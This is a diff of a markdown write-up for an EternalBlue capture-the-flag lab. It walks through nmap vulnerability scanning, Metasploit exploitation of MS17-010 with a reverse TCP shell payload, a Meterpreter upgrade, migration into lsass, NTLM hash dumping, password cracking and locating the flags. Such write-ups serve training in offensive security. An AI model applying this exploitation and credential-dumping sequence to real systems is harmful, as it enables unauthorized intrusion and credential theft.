@@ -5,13 +5,13 @@
 **Category**: Exploitation of SMB & Windows <br>
 **Description**: Demonstrate EternalBlue exploitation on a vulnerable Windows host.
 
----
+
 
 ## Tools
 - **Nmap** (service/OS and vulnerability scripts)
 - **Metasploit** (exploit and post modules)
 - **John** (password cracking)
----
+
 
 ## Target
 IP: `10.201.74.172` (exported as an environment variable for convenience)
@@ -20,7 +20,7 @@ IP: `10.201.74.172` (exported as an environment variable for convenience)
 export IP=10.201.74.172
 ```
 
----
+
 # Task 1: Recon
 
 To start I performed an Nmap scan to identify open ports, services, and potential vulnerabilities:
@@ -38,7 +38,7 @@ nmap -sV -sC -sS -T4 --script vuln $IP
 - Number of open ports under 1000: **3**
 - Vulnerability identified: **ms17-010**
 
----
+
 # Task 2: Gain Access 
 Metasploit has a module for this exploit, so I started Metasploit to exploit MS17-010.
 
@@ -67,7 +67,7 @@ set payload windows/x64/shell/reverse_tcp
 **Result:** Then I ran with these options set. It was a successful exploitation and a shell was obtained:
 <img width="934" height="95" alt="Pasted image 20250923153221" src="https://github.com/user-attachments/assets/0bfd84d3-a559-4d42-a034-2e2c1c83fa55" />
 
----
+
 # Task 3: Escalate
 Next I upgraded the shell to a Meterpreter. I backgrounded the previously gained shell (CTRL+Z):
 <img width="544" height="83" alt="Pasted image 20250923153422" src="https://github.com/user-attachments/assets/263f3f3e-d946-4fd6-8f41-40eeb7a7e2eb" />
@@ -98,7 +98,7 @@ After converting, I ran:
 I reviewed running processes and targeted `lsass` (a common process to extract credentials when privileged):
 <img width="572" height="395" alt="Pasted image 20250923161119" src="https://github.com/user-attachments/assets/8f385381-98fd-440b-acb1-3f0a862b847a" /> 
 
----
+
 # Task 4: Cracking
 Next I run the command 'hashdump' and retrieved NTLM hashes for `Administrator`, `Guest`, and `Jon`:
 <img width="658" height="62" alt="Pasted image 20250923161335" src="https://github.com/user-attachments/assets/d234db07-951c-498e-b64b-ba09ec17af64" />
@@ -127,7 +127,7 @@ The next flag was located at `C:\Windows\System32\config\flag2.txt`<br>
 Third (final) flag found in user Jon's directory: `C:\Users\Jon\Documents\flag3.txt`<br>
 <img width="513" height="2051" alt="Pasted image 20250923165329" src="https://github.com/user-attachments/assets/74a2abb9-3824-4a1a-8188-7c0afda33c43" />
 
----
+
 # Takeaways
 - **EternalBlue** targets SMBv1 and can allow remote code execution on unpatched Windows systems.
 - **Nmap scripts** (like `--script vuln` used in this CTF) are effective for quickly identifying vulnerable services during reconnaissance.
